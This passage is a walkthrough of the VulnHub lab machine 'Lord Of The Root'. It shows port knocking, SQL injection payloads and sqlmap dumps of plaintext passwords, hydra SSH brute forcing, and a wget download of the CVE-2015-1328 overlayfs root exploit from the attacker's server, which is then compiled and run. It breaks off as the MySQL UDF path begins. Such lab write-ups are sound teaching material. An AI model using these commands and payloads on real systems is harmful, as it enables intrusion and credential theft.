# Lord Of The Root: 1.0.1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Lord Of The Root: 1.0.1 |
| **Difficulty** | Easy–Intermediate (author: *"very similar in difficulty to those I was breaking on the OSCP"*) |
| **Author** | KookSec |
| **Released** | 23 September 2015 |
| **Theme** | *The Lord of the Rings* |
| **VulnHub Entry** | <https://vulnhub.com/entry/lord-of-the-root-101,129/> |
| **Download** | <https://vulnhub.com/entry/lord-of-the-root-101,129/#download> (`LordOfTheRoot_1.0.1.ova`) |
| **Attacker** | Kali Linux, host-only network |
| **Target OS** | Ubuntu 14.04 LTS (hostname `LordOfTheRoot`) |

> **VirtualBox import problem (documented by the author).** The OVA is VMware-flavoured
> and VirtualBox may reject the OVF. The fix:
> 1. `tar -xf LordOfTheRoot_1.0.1.ova` (an OVA is just a tarball).
> 2. Install VMware's `ovftool` and convert: `ovftool LordOfTheRoot_1.0.1.ovf LordOfTheRoot.ovf`.
> 3. Edit the `.ovf` in a text editor: replace every `ElementName` with `Caption`,
>    and the single `vmware.sata.ahci` with `AHCI`.
> 4. **Delete the `.mf` manifest file** — otherwise VirtualBox complains the SHA
>    does not match.
> 5. Import the OVF.

Throughout we assume:

```text
Attacker (Kali)   : 192.168.56.10
Target (LOTR)     : 192.168.56.101
```

---

## 0. What you will learn

1. **Port knocking** — an obscure but real "hide a service" technique, and how to
   defeat it with `nmap`.
2. **Why `nmap -p-` matters** — a service that appears *after* you knock.
3. **`robots.txt`, HTML comments and layered base64 encoding.**
4. **`cyberchef` / `base64 -d`** — decoding nested encodings.
5. **SQL injection in a login form**, both *authentication bypass* and *data
   extraction*, using `sqlmap`.
6. **Reading `sqlmap` output**: injection types (boolean-blind, time-blind,
   UNION), databases, tables, columns, dumps.
7. **Credential reuse** — database passwords tried against SSH.
8. **Three separate privilege-escalation paths**, one of which is a **manual stack
   buffer overflow** written by hand — the highlight of this box:
   - kernel exploit (**CVE-2015-1328**, overlayfs),
   - MySQL running as root → **UDF injection**,
   - **buffer overflow** in a SUID binary (`pattern_create` → offset → `jmp esp` →
     shellcode).

**The intended chain:**
only port 22 is open → the SSH banner says *"Knock Friend to Enter… Easy as 1,2,3"*
→ **knock ports 1, 2, 3 in order** → port **1337** opens → a web page with an image →
`/robots.txt` source contains **base64 → base64** → `/978345210/index.php` → a login
form → **SQL injection** → dump the `Webapp.Users` table → `smeagol:MyPreciousR00t` →
SSH in → Ubuntu 14.04 kernel → **overlayfs local root** → `/root/Flag.txt`.

---

## 1. Reconnaissance

```bash
ip a | grep -w inet
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:4c:1a:2b, IPv4: 192.168.56.10
Starting arp-scan 1.10.0 with 256 hosts
192.168.56.1    0a:00:27:00:00:0e   (Unknown: locally administered)
192.168.56.10   08:00:27:4c:1a:2b   PCS Systemtechnik GmbH
192.168.56.101  08:00:27:3d:8e:19   PCS Systemtechnik GmbH   <-- target

3 packets received by filter, 0 packets dropped by kernel
```

**Target IP: `192.168.56.101`**

---

## 2. Enumeration

### 2.1 First scan — almost nothing

```bash
sudo nmap -sV -sC -p- -T4 -oN scans/lotr-1.txt 192.168.56.101
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-03 11:04 EDT
Nmap scan report for 192.168.56.101
Host is up (0.00035s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 25:34:34:0e:7d:ad:9b:8e:2d:cc:11:1c:5e:9f:5c:9b (DSA)
|   2048 6d:0a:8f:62:73:cf:5d:7b:5e:ad:52:16:3e:98:1e:5b (RSA)
|_  256 6f:5e:9e:6b:5f:6b:6b:6b:6b:6b:6b:6b:6b:6b:6b:6b (ECDSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 156.20 seconds
```

> **One open port. And 65 534 filtered.** That is a *deliberate* firewall posture,
> not an accident. Two readings are possible:
> 1. This is a genuinely minimal box and the only path in is SSH (brute force? key
>    reuse? a CVE?).
> 2. **Something is hiding.**
>
> `OpenSSH 6.6.1p1 Ubuntu 2ubuntu2` → **Ubuntu 14.04 (Trusty)**. File that away;
> the kernel version on 14.04 is our privilege-escalation target.

### 2.2 Talk to SSH — read the banner

```bash
ssh root@192.168.56.101
```

```text
The authenticity of host '192.168.56.101 (192.168.56.101)' can't be established.
ECDSA key fingerprint is SHA256:xQ4vUqJ5mN8pL2kR7tY0wE3aS6dF9gH1jK4lZ7xC0vB.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.101' (ECDSA) to the list of known hosts.

Knock Friend to Enter
Easy as 1,2,3

root@192.168.56.101's password:
Permission denied, please try again.
```

> **`Knock Friend to Enter` / `Easy as 1,2,3`.**
>
> The first line is Gandalf's line at the Black Gate of Moria — *"Speak, friend, and
> enter"* — the famous riddle whose answer was that the word "friend" *itself* was
> the password. The second line is the hint: **1, 2, 3**.
>
> This is a **port knocking** setup.
>
> **What is port knocking?** A daemon (`knockd`) watches the firewall logs (or a raw
> socket) for connection attempts to a specific sequence of *closed* ports, in a
> specific order, within a time window. When the correct sequence arrives, it runs a
> command — typically `iptables -I INPUT -p tcp --dport 1337 -j ACCEPT` — opening a
> previously invisible service.
>
> **Why anyone uses it:** as a *stealth* layer. A port scan never shows the service,
> so the attack surface is invisible to casual reconnaissance.
>
> **Why it is not real security:** the "secret" is transmitted as plaintext TCP
> connection attempts. Anyone who can see the traffic (a mirror port, a pcap, a
> compromised router) sees the sequence. Anyone who guesses it — as we did from a
> two-line banner — gets in. It is *security through obscurity*, and obscurity is not
> a control.
>
> **Config example** (`/etc/knockd.conf`), for reference:
> ```ini
> [options]
>     logfile = /var/log/knockd.log
> [openCloseSSH]
>     sequence      = 1,2,3
>     seq_timeout   = 10
>     tcpflags      = syn
>     start_command = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 1337 -j ACCEPT
>     cmd_timeout   = 60
>     stop_command  = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 1337 -j ACCEPT
> ```

### 2.3 Knock

The sequence must be sent **in order, without randomisation, with actual TCP
connections**. `nmap`'s `-r` disables its default port randomisation and `-sT`
forces full connect() handshakes (a SYN scan `-sS` may be enough, but connect is
reliable). `-Pn` skips host discovery.

```bash
sudo nmap -Pn -r -sT -p1-3 192.168.56.101
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-03 11:09 EDT
Nmap scan report for 192.168.56.101
Host is up (0.00040s latency).

PORT    STATE    SERVICE
1/tcp   filtered tcpmux
2/tcp   filtered compressnet
3/tcp   filtered compressnet

Nmap done: 1 IP address (1 host up) scanned in 1.22 seconds
```

> **The scan "failed" — and that is exactly what we wanted.** All three ports are
> `filtered` (the firewall drops the SYN). `knockd` does not care whether the port
> is open; it only cares that a **SYN arrived, in that order**. We have just rung
> the doorbell three times.
>
> **Alternative knock tools**, all of which work:
> ```bash
> knock 192.168.56.101 1 2 3                    # the 'knock' client
> for p in 1 2 3; do timeout 1 bash -c "</dev/tcp/192.168.56.101/$p"; done
> sudo hping3 -S -p 1 192.168.56.101 -c 1 ; sudo hping3 -S -p 2 ... ; sudo hping3 -S -p 3 ...
> ```
> The `bash /dev/tcp/HOST/PORT` trick is worth memorising — it needs no tools at all
> and works on almost any Linux box, including ones you have a limited shell on.

### 2.4 Re-scan — the hidden port appears

```bash
sudo nmap -p- -sV -T4 192.168.56.101
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-03 11:10 EDT
Nmap scan report for 192.168.56.101
Host is up (0.00037s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 74.51 seconds
```

> **Port 1337 — Apache.** (`1337` is *leet* speak for "elite", a long-standing
> hacker-culture joke; seeing it on a CTF box is a wink from the author.)
>
> **Lesson:** if your first scan shows almost nothing, do **not** conclude the box is
> bare. Re-scan after every new piece of information — knocking, authenticating,
> triggering a service, changing your source IP, waiting for a `cmd_timeout`.

![Port 1337 opens after knocking](images/01-knock.png)

### 2.5 Browse port 1337

```text
http://192.168.56.101:1337/
```

A single image: **Gandalf**, with the caption *"You Shall Not Pass"*. No links, no
text. View the source:

```html
<html>
<body>
<center><img src="images/gandalf.jpg" alt="You shall not pass!"></center>
</body>
</html>
```

Nothing. So enumerate the web app.

### 2.6 Directory brute force

```bash
gobuster dir -u http://192.168.56.101:1337/ \
  -w /usr/share/wordlists/dirb/common.txt -x html,txt,php -t 40 -q
```

```text
/404.html             (Status: 200) [Size: 116]
/images               (Status: 301) [Size: 323]
/index.html           (Status: 200) [Size: 64]
```

```bash
nikto -h http://192.168.56.101:1337
```

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.101
+ Target Hostname:    192.168.56.101
+ Target Port:        1337
+ Start Time:         2024-05-03 11:14:02 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ /: Cookie PHPSESSID created without the httponly flag.
+ /: Uncommon header 'x-ob-mode' found, with contents: 1.
+ /images/: Directory indexing found.
+ /images/: This might be interesting.
+ /robots.txt: Entry "/secret/" is returned a non-forbidden or redirect HTTP code (200).
+ 8102 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2024-05-03 11:16:31 (GMT-4) (149 seconds)
---------------------------------------------------------------------------
```

> **Nikto found `/robots.txt`** — and, unusually, reported that a `Disallow:` entry
> (`/secret/`) returns **HTTP 200**, not 403. Two findings at once.
>
> **`nikto` vs `gobuster`:** `gobuster` brute-forces *paths from a wordlist*;
> `nikto` runs a curated battery of ~7 000 *checks* — known-bad files, dangerous
> headers, default installs, misconfigurations. They complement each other; always
> run both.

### 2.7 `robots.txt` → nested base64

```bash
curl -s http://192.168.56.101:1337/robots.txt
```

The page renders **an image** (another Gandalf). So look at the source:

```bash
curl -s http://192.168.56.101:1337/robots.txt | cat
```

```html
<html>
<body>
<center><img src="images/gandalf2.jpg"></center>
<!-- THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh -->
</body>
</html>
```

> **An HTML comment containing what looks like base64.** Decode it:

```bash
echo 'THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh' | base64 -d ; echo
```

```text
Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!
```

> **Two things happened.** The decode produced *another* base64 string
> (`Lzk3ODM0NTIxMC9pbmRleC5waHA=`, note the trailing `=` padding) **plus the word
> "Closer!"** — the author telling you you are on the right track but not finished.
>
> **Recognising base64 at a glance:** length is a multiple of 4, the alphabet is
> `A–Z a–z 0–9 + /`, and it often ends with `=` or `==` padding. Nested encodings
> like this are extremely common in CTFs *and* in real malware obfuscation.
>
> **Decode again:**

```bash
echo 'Lzk3ODM0NTIxMC9pbmRleC5waHA=' | base64 -d ; echo
```

```text
/978345210/index.php
```

> **A hidden directory: `/978345210/index.php`.** The random digit string is
> deliberately unguessable by a wordlist — the author is teaching you that
> *brute force will never find this; reading the source will.*

**CyberChef one-liner equivalent** (<https://gchq.github.io/CyberChef/>): drag in
"From Base64" twice and set it to repeat until no change — the "Magic" / recursive
recipe handles arbitrary nesting.

```bash
curl -sI http://192.168.56.101:1337/978345210/index.php
```

```text
HTTP/1.1 200 OK
Date: Fri, 03 May 2024 15:19:44 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.14
Content-Type: text/html
```

`X-Powered-By: PHP/5.5.9` — a PHP login form.

![Decoding the nested base64 to reveal /978345210/index.php](images/02-base64.png)

### 2.8 The login form

```text
http://192.168.56.101:1337/978345210/index.php
```

```html
<form method="post" action="login.php">
  <input type="text" name="username" placeholder="Username">
  <input type="password" name="password" placeholder="Password">
  <input type="submit" name="submit" value="Login">
</form>
```

Try the classics: `admin:admin`, `root:root`, `' OR 1=1 --`… all fail in the browser.
Time to automate.

---

## 3. Exploitation — SQL injection with `sqlmap`

### 3.1 What SQL injection is (in one paragraph)

The application builds a SQL query by *concatenating your input* into a string, e.g.

```sql
SELECT * FROM Users WHERE username='$user' AND password='$pass'
```

If you submit `username = test' AND SLEEP(5)-- -`, the query becomes

```sql
SELECT * FROM Users WHERE username='test' AND SLEEP(5)-- -' AND password=''
```

The `'` closes the string literal, `--` (with a trailing space) starts a SQL comment
that swallows the rest, and `SLEEP(5)` runs. **You have written SQL.** From there you
can read any table the database user can reach — including its own credentials.

### 3.2 Capture the request

`sqlmap` needs the exact request. Two easy ways:

**Way A — from the URL (GET forms) or with `--forms`:**

```bash
sqlmap -u 'http://192.168.56.101:1337/978345210/index.php' --forms --batch
```

**Way B — from Burp Suite (best practice).** Configure Burp as your browser proxy
(`Proxy → Open Browser`), enable *Intercept*, submit the login form, right-click the
request → *Copy to file*, save as `sqli.txt`:

```text
POST /978345210/index.php HTTP/1.1
Host: 192.168.56.101:1337
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

username=test&password=test&submit=+Login+
```

Then:

```bash
sqlmap -r sqli.txt --batch --level=5 --risk=3
```

> **`sqlmap` flags explained:**
> - `-r <file>` → read the whole raw HTTP request from a file. This preserves
>   cookies, custom headers and the exact POST body.
> - `-u <url>` → target a URL directly.
> - `--forms` → let sqlmap parse and test the HTML forms on the page itself.
> - `--batch` → never prompt; use default answers. Essential for scripted runs.
> - `--level` (1–5) → how hard to try: 3+ tests `User-Agent`/`Referer`/cookies; 5
>   tests everything including HTTP headers.
> - `--risk` (1–3) → how *dangerous* the test payloads may be. 3 includes
>   time-based and heavy `OR` payloads that could alter data.
> - `--technique=BEUSTQ` → restrict to Boolean-blind, Error, Union, Stacked,
>   Time-blind, inline-Query.

### 3.3 Confirm the injection

```bash
sqlmap -r sqli.txt --batch --level=5 --risk=3 --technique=BT --dbs
```

```text
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual
consent is illegal. It is the end user's responsibility to obey all applicable
local, state and federal laws. Developers assume no liability and are not
responsible for any misuse or damage caused by this program

[*] starting @ 11:24:07 /2024-05-03/

[11:24:07] [INFO] parsing HTTP request from 'sqli.txt'
[11:24:07] [INFO] testing connection to the target URL
[11:24:07] [INFO] checking if the target is protected by some kind of WAF/IPS
[11:24:08] [INFO] testing if the target URL content is stable
[11:24:08] [INFO] target URL content is stable
[11:24:08] [INFO] testing if POST parameter 'username' is dynamic
[11:24:08] [INFO] POST parameter 'username' appears to be dynamic
[11:24:09] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[11:24:09] [INFO] testing for SQL injection on POST parameter 'username'
[11:24:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[11:24:33] [INFO] POST parameter 'username' seems to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[11:24:33] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[11:24:41] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[11:25:02] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns.
[11:25:03] [INFO] target URL appears to have 3 columns in query
[11:25:09] [INFO] POST parameter 'username' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable

POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 486 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=test' AND 4127=4127 AND 'enuE'='enuE&password=test&submit= Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 7506 FROM (SELECT(SLEEP(5)))vOBo) AND 'enuE'='enuE&password=test&submit= Login

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: username=test' UNION ALL SELECT NULL,NULL,CONCAT(0x716b717071,0x6c6b706a,...)-- -&password=test&submit= Login
---
[11:25:10] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 14.04 (Trusty Tahr)
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.12
```

> **How to read this — it is dense but every line teaches something.**
>
> | Field | Meaning |
> | --- | --- |
> | `boolean-based blind` | The page's *response differs* (content length / a word present) depending on whether an injected condition is true or false. sqlmap asks yes/no questions and infers data one bit at a time. |
> | `time-based blind` | No visible difference at all, so sqlmap injects `SLEEP(5)` and **measures how long the response takes**. Slow = true. |
> | `UNION query` | The original `SELECT` has **3 columns**; sqlmap appends `UNION ALL SELECT NULL,NULL,<data>` and the extra row is rendered straight into the page. The fastest technique when it works. |
> | `ORDER BY technique` | Instead of guessing column counts, sqlmap injects `ORDER BY 1`, `ORDER BY 2`, … until the query errors. The last working number is the column count. |
> | `CONCAT(0x716b717071, ...)` | sqlmap wraps its output in unique **hex markers** (`0x71…` = the string `qqqpq`) so it can find its own answer inside a page full of HTML. |
> | `heuristic ... might not be injectable` | sqlmap's fast pre-test failed. This is exactly why `--level=5 --risk=3` matters — it kept going and found a *blind* injection that the heuristic missed. **Never trust a negative heuristic result.** |
> | `the back-end DBMS is MySQL` | Fingerprinted from the `SLEEP()` behaviour and version functions. |
> | `PHP 5.5.9`, `Apache 2.4.7`, `Ubuntu 14.04` | Consistent with the SSH banner. Good cross-validation. |

### 3.4 Authentication bypass (quick win, but a dead end)

```bash
sqlmap -r sqli.txt --batch --level=3 --risk=2 --technique=B \
  --tamper=space2comment -p username --auth-type=Basic --flush-session
```

Or simply in Burp's Repeater:

```text
username=test' UNION ALL SELECT NULL,NULL,NULL#&password=x&submit=Login
```

The app logs us in… to a page with nothing on it. **Authentication bypass is not the
goal; the data is.** Move on.

### 3.5 Enumerate the database

```bash
sqlmap -r sqli.txt --batch --dbs
```

```text
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] Webapp
```

```bash
sqlmap -r sqli.txt --batch -D Webapp --tables
```

```text
Database: Webapp
[1 table]
+-------+
| Users |
+-------+
```

```bash
sqlmap -r sqli.txt --batch -D Webapp -T Users --columns
```

```text
Database: Webapp
Table: Users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(11)     |
| password | varchar(50) |
| username | varchar(50) |
+----------+-------------+
```

> **`information_schema`, `mysql`, `performance_schema`** are MySQL's own system
> schemas — always present, always ignore them. **`Webapp`** is the application
> database. That is where the interesting data lives.
>
> Note `password` is `varchar(50)` — not a `CHAR(60)` bcrypt column. The passwords
> are stored in **plaintext**. That is itself a finding.

### 3.6 Dump the users table

```bash
sqlmap -r sqli.txt --batch -D Webapp -T Users -C id,username,password --dump
```

```text
Database: Webapp
Table: Users
[5 entries]
+----+------------+------------------+
| id | username   | password         |
+----+------------+------------------+
| 1  | frodo      | iwilltakethering |
| 2  | smeagol    | MyPreciousR00t   |
| 3  | aragorn    | AndMySword       |
| 4  | legolas    | AndMyBow         |
| 5  | gimli      | AndMyAxe         |
+----+------------+------------------+

[11:31:44] [INFO] table 'Webapp.Users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.56.101/dump/Webapp/Users.csv'
```

> **Five Fellowship members, five plaintext passwords.** sqlmap wrote them to a CSV
> too — always useful for feeding into other tools.
>
> Build credential lists for the next step:
> ```bash
> D=/home/kali/.local/share/sqlmap/output/192.168.56.101/dump/Webapp
> tail -n +2 $D/Users.csv | cut -d, -f2 > usernames.txt
> tail -n +2 $D/Users.csv | cut -d, -f3 > passwords.txt
> cat usernames.txt
> ```
> ```text
> frodo
> smeagol
> aragorn
> legolas
> gimli
> ```

![sqlmap dumping the Users table](images/03-sqlmap.png)

---

## 4. Foothold — SSH with the recovered credentials

Try every username against every password (credential stuffing):

```bash
hydra -L usernames.txt -P passwords.txt ssh://192.168.56.101 -t 4 -f
```

```text
Hydra v9.5 starting at 2024-05-03 11:34:12
[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries
[DATA] attacking ssh://192.168.56.101:22/
[22][ssh] host: 192.168.56.101   login: smeagol   password: MyPreciousR00t
[STATUS] attack finished for 192.168.56.101 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

```bash
ssh smeagol@192.168.56.101
```

```text
smeagol@192.168.56.101's password:
Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.13.0-65-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Fri May  3 11:36:02 EDT 2024

  System load:  0.0               Processes:           141
  Usage of /:   12.4% of 9.70GB   Users logged in:     0
  Memory usage: 21%               IP address for eth0: 192.168.56.101
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Fri Sep 25 04:11:22 2015 from 192.168.56.1
smeagol@LordOfTheRoot:~$ id
uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)
smeagol@LordOfTheRoot:~$ sudo -l
[sudo] password for smeagol:
Sorry, user smeagol may not run sudo on LordOfTheRoot.
```

> **We are in.** Note the banner: **`3.13.0-65-generic i686`** — Ubuntu 14.04,
> kernel 3.13, **32-bit**. Both facts decide our privilege-escalation options.
>
> `sudo -l` says no sudo. No group memberships. So: kernel, SUID, or service
> misconfiguration.

![SSH login as smeagol](images/04-ssh.png)

### 4.1 Standard post-exploitation enumeration

```bash
smeagol@LordOfTheRoot:~$ uname -a
Linux LordOfTheRoot 3.13.0-65-generic #105-Ubuntu SMP Tue Oct 6 15:45:10 UTC 2015 i686 i686 i686 GNU/Linux
smeagol@LordOfTheRoot:~$ cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
smeagol@LordOfTheRoot:~$ ls /home
aragorn  frodo  gimli  legolas  smeagol
smeagol@LordOfTheRoot:~$ ls -la /SECRET
total 16
drwxr-xr-x  5 root root 4096 Sep 23  2015 .
drwxr-xr-x 23 root root 4096 Sep 23  2015 ..
drwxr-xr-x  2 root root 4096 Sep 23  2015 door1
drwxr-xr-x  2 root root 4096 Sep 23  2015 door2
drwxr-xr-x  2 root root 4096 Sep 23  2015 door3
smeagol@LordOfTheRoot:~$ ls -la /SECRET/door1
total 20
drwxr-xr-x 2 root root 4096 Sep 23  2015 .
drwxr-xr-x 5 root root 4096 Sep 23  2015 ..
-rwsr-xr-x 1 root root 5150 Sep 23  2015 file
```

> **A `/SECRET` directory with three "doors", each holding a SUID-root binary named
> `file`.** That is the buffer-overflow challenge (§ 6.3).
>
> **And note: the binaries move.** The author shipped a Python script
> (`/root/ran_dir.py`) that periodically swaps which door holds the *vulnerable*
> binary — a deliberate anti-script-kiddie measure. You identify the right one by
> **size: 5150 bytes is vulnerable, the decoys are 7370 bytes.**

```bash
smeagol@LordOfTheRoot:~$ find / -perm -4000 -type f 2>/dev/null
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/umount
/SECRET/door1/file
/SECRET/door2/file
/SECRET/door3/file
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mtr
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
```

---

## 5. Privilege escalation — Path 1: the kernel (CVE-2015-1328)

### 5.1 Match kernel to exploit

```bash
searchsploit ubuntu 14.04 local
```

```text
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Esc | linux/local/37292.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR | linux/local/45010.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation (KASLR & SMEP)   | linux/local/45175.c
----------------------------------------------------------------------------------------------- ---------------------------------
```

> **`linux/local/37292.c`** — the **overlayfs** exploit. Our kernel is
> `3.13.0-65`, which is inside the vulnerable range `3.13.0 < 3.19`. Perfect match.
>
> **How CVE-2015-1328 works (conceptually):** Linux's **OverlayFS** stacks a
> writable "upper" directory over a read-only "lower" one — that is how container
> images work. The Ubuntu kernel allowed *unprivileged users* to mount an overlayfs
> in a user namespace. When a setuid binary lived in the lower layer, the overlay
> copy **incorrectly preserved the SUID bit and root ownership** into the upper
> layer, where the unprivileged user could then *write* to it. Overwrite a SUID-root
> `/bin/bash`, run it, get root. A beautiful example of two individually-reasonable
> features composing into a total break.

### 5.2 Transfer the exploit to the target

The target has `wget`, so a simple HTTP server works.

**Kali:**

```bash
searchsploit -m linux/local/37292.c
mv 37292.c ofs.c
python3 -m http.server 8000
```

```text
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Target:**

```bash
smeagol@LordOfTheRoot:~$ cd /tmp
smeagol@LordOfTheRoot:/tmp$ wget http://192.168.56.10:8000/ofs.c
--2024-05-03 11:44:12--  http://192.168.56.10:8000/ofs.c
Connecting to 192.168.56.10:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/x-csrc]
Saving to: 'ofs.c'

100%[======================================>] 4,968       --.-K/s   in 0s

2024-05-03 11:44:12 (412 MB/s) - 'ofs.c' saved [4968/4968]
```

Kali's HTTP server logs the fetch:

```text
192.168.56.101 - - [03/May/2024 11:44:12] "GET /ofs.c HTTP/1.1" 200 -
```

> **`python3 -m http.server 8000`** turns the current directory into a web root.
> It is the single most useful file-transfer trick in a lab. (On Python 2 the module
> was `SimpleHTTPServer`: `python -m SimpleHTTPServer 8000`.)
>
> **Always verify the byte count after transfer** — `4968` on the target matches
> `Length: 4968` on the server. A 0-byte file means it silently failed.

### 5.3 Compile and run

```bash
smeagol@LordOfTheRoot:/tmp$ gcc ofs.c -o ofs
smeagol@LordOfTheRoot:/tmp$ ./ofs
```

```text
spawnining threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1000(smeagol)
```

> **How to read that output — this exploit is clever:**
> - `mount #1` / `mount #2` → it creates two overlayfs mounts inside a user
>   namespace.
> - `/etc/ld.so.preload created` → **this is the actual trick.** Instead of
>   overwriting a SUID binary, it abuses the **dynamic linker preload** mechanism.
>   `/etc/ld.so.preload` is a system-wide list of shared libraries that the linker
>   loads into *every* dynamically-linked program — **including SUID-root ones**.
>   The exploit gets a world-writable copy of that file through the overlayfs bug,
>   writes the path of its own malicious `.so` into it…
> - `creating shared library` → …builds a `.so` whose constructor calls
>   `setuid(0); setgid(0); system("/bin/sh")`.
> - The next time *any* program runs — here, the exploit's own `id` — the library
>   is preloaded as root, and the shell drops.
>
> `uid=0(root)` = **root**. Note the `#` prompt replaced `$`.
>
> **Cleanup:** this exploit leaves `/etc/ld.so.preload` and a stray `.so` behind,
> which can break the machine. **Snapshot before, revert after.** Or remove them:
> ```bash
> # rm -f /etc/ld.so.preload /tmp/ofs.so
> ```

### 5.4 Grab the flag

```bash
# cd /root
# ls -la
total 28
drwx------  3 root root 4096 Sep 23  2015 .
drwxr-xr-x 23 root root 4096 Sep 23  2015 ..
-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-r--r--  1 root root   52 Sep 23  2015 Flag.txt
-rw-r--r--  1 root root  828 Sep 23  2015 ran_dir.py
# cat Flag.txt
```

```text
Th3 fl4g is: 0ff1c3r1c4llyr00t3d
```

**Flag captured.** ✅

> Also take a look at `ran_dir.py` — it is the script that shuffles the binaries
> between `door1`, `door2` and `door3`. Reading the author's own tooling is a great
> way to understand a box's design.

![root and Flag.txt](images/05-flag.png)

---

## 6. Privilege escalation — Path 2: MySQL running as root (UDF injection)

The author said there are **two designed privilege-escalation methods**. Here is the
second, and it is a genuinely important real-world technique.

### 6.1 Spot it

```bash
smeagol@LordOfTheRoot:~$ ps aux | grep -i mysql
root      1021  0.4  3.1 610828 32044 ?  Ssl  11:20   0:04 /usr/sbin/mysqld
```

> **`mysqld` is running as `root`.** That is a serious misconfiguration. MySQL should
> always run as the dedicated `mysql` user.
>
> **Why it matters — UDF injection:** MySQL lets an administrator install a **User
> Defined Function** by loading a shared object into its plugin directory and
> registering it with `CREATE FUNCTION`. The function then executes **inside the
> `mysqld` process**. If `mysqld` is root, your function runs as root. This is the
> classic "MySQL → root" escalation, weaponised as `raptor_udf2.c` and as
> Metasploit's `exploit/multi/mysql/mysql_udf_payload`.

### 6.2 Find the MySQL credentials

They are sitting in the web app's config:

```bash
smeagol@LordOfTheRoot:~$ cat /var/www/978345210/config.php
```

```php
<?php
$host = "localhost";
$username = "root";
$password = "darkshadow";
$database = "Webapp";
$conn = new mysqli($host, $username, $password, $database);
?>
```

> **Hard-coded root database credentials in a PHP config file, readable by
